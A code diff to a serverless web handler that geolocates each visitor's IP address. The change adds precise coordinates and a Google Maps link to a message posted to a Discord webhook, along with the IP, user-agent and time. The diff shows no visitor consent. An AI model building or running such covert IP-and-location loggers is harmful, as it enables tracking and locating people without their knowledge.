@@ -10,14 +10,15 @@ export default async function handler(req, res) {
         const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
         const geoData = await geoResponse.json();
 
-        const { city, region, country_name } = geoData;
+        const { city, region, country_name, latitude, longitude } = geoData;
+        const mapLink = latitude && longitude ? `https://www.google.com/maps?q=${latitude},${longitude}` : 'Location unavailable';
 
         // Log to Discord
         await fetch(webhookUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                content: `🚀 **Mobile-Reliable Visit!**\n**IP**: ${ip}\n**Location**: ${city || 'Unknown'}, ${region || 'Unknown'}, ${country_name || 'Unknown'}\n**User-Agent**: ${req.headers['user-agent']}\n**Time**: ${new Date().toLocaleString()}`
+                content: `🚀 **New Visit Tracked!**\n**IP**: ${ip}\n**Location**: ${city || 'Unknown'}, ${region || 'Unknown'}, ${country_name || 'Unknown'}\n**Map**: ${mapLink}\n**User-Agent**: ${req.headers['user-agent']}\n**Time**: ${new Date().toLocaleString()}`
             })
         });
 
